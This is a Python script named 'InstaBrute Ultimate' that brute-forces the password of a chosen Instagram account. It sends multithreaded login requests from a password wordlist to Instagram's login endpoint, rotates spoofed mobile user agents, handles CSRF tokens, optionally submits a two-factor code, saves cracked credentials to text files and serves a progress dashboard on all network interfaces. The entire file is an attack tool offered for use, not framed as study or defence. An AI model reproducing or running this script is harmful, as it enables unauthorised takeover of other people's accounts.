#!/usr/bin/env python3
import sys, os, time, threading, argparse, json, random
from concurrent.futures import ThreadPoolExecutor, as_completed
try:
    import requests
    from flask import Flask, request, jsonify, render_template_string
except ImportError:
    os.system("pip install requests flask")
    import requests
    from flask import Flask, request, jsonify, render_template_string

USER_AGENTS = ["Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"]
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": random.choice(USER_AGENTS)})
LOGIN_URL = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
CSRF_URL = "https://www.instagram.com/"

def get_csrf():
    try:
        r = SESSION.get(CSRF_URL, timeout=10)
        return r.cookies.get("csrftoken", "")
    except:
        return ""

def login_attempt(username, password, twofa=None):
    csrf = get_csrf()
    if not csrf:
        return False, "No CSRF"
    SESSION.headers.update({"X-CSRFToken": csrf, "X-Requested-With": "XMLHttpRequest"})
    payload = {"username": username, "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:0:{password}", "queryParams": "{}", "optIntoOneTap": "false"}
    if twofa:
        payload["twoFactorVerification"] = "1"
        payload["verificationCode"] = twofa
    try:
        r = SESSION.post(LOGIN_URL, data=payload, timeout=15)
        if r.status_code != 200:
            return False, f"HTTP {r.status_code}"
        data = r.json()
        if data.get("authenticated"):
            return True, "SUCCESS"
        if data.get("two_factor_required") or data.get("two_factor_info"):
            return "2FA", data.get("two_factor_info", {})
        if "checkpoint_required" in str(data):
            return False, "Challenge"
        return False, data.get("message", "Failed")
    except Exception as e:
        return False, str(e)

def smart_check(username):
    url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
    try:
        r = SESSION.get(url, timeout=10)
        return r.status_code == 200 and r.json().get("data", {}).get("user") is not None
    except:
        return False

def worker(args, password, twofa_code):
    username = args.username
    res, info = login_attempt(username, password, twofa_code)
    if res == True:
        print(f"\n✅ VALID: {username}:{password}")
        with open("valid.txt", "a") as f:
            f.write(f"{username}:{password}\n")
        return "VALID", password
    elif res == "2FA" and args.twofa and twofa_code:
        res2, _ = login_attempt(username, password, twofa_code)
        if res2 == True:
            print(f"\n✅ VALID with 2FA: {username}:{password}:{twofa_code}")
            with open("valid_2fa.txt", "a") as f:
                f.write(f"{username}:{password}:{twofa_code}\n")
            return "VALID", password
    return "FAIL", password

def web_dashboard(args):
    app = Flask(__name__)
    status = {"running": True, "found": [], "total": 0, "tried": 0}
    @app.route("/")
    def index():
        return render_template_string("""<html><body><h1>InstaBrute Dashboard</h1><p>Found: {{ status.found }}</p><p>Tried: {{ status.tried }}/{{ status.total }}</p><p>Running: {{ status.running }}</p></body></html>""", status=status)
    @app.route("/api/status")
    def api():
        return jsonify(status)
    print(f"🌐 Web UI at http://0.0.0.0:{args.web_port}")
    app.run(host="0.0.0.0", port=args.web_port, debug=False, threaded=True)

def main():
    parser = argparse.ArgumentParser(description="InstaBrute Ultimate")
    parser.add_argument("--username", required=True)
    parser.add_argument("--password-file", required=True)
    parser.add_argument("--threads", type=int, default=5)
    parser.add_argument("--delay", type=float, default=0.2)
    parser.add_argument("--smart", action="store_true")
    parser.add_argument("--graphql", action="store_true")
    parser.add_argument("--twofa", action="store_true")
    parser.add_argument("--web-port", type=int, default=5000)
    parser.add_argument("--analysis", action="store_true")
    args = parser.parse_args()

    if not os.path.exists(args.password_file):
        print(f"❌ File not found: {args.password_file}")
        sys.exit(1)

    with open(args.password_file, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    if args.smart and not smart_check(args.username):
        print(f"⚠️ {args.username} may not exist. Continuing anyway.")

    print(f"🚀 Starting attack on {args.username} with {len(passwords)} passwords")
    if args.web_port:
        threading.Thread(target=web_dashboard, args=(args,), daemon=True).start()

    twofa_code = None
    if args.twofa:
        twofa_code = input("Enter 2FA code (if required, else leave empty): ").strip()

    found = False
    total = len(passwords)
    tried = 0
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(worker, args, p, twofa_code): p for p in passwords}
        for future in as_completed(futures):
            status, pwd = future.result()
            tried += 1
            if status == "VALID":
                found = True
                print(f"✅ Found: {args.username}:{pwd}")
                executor.shutdown(wait=False, cancel_futures=True)
                break
            print(f"⏳ Tried: {tried}/{total} - Last: {pwd}")
            time.sleep(args.delay)

    if not found:
        print("❌ No valid password found.")
    if args.analysis:
        print(f"📊 Total tried: {tried}, Found: {found}")

if __name__ == "__main__":
    main()
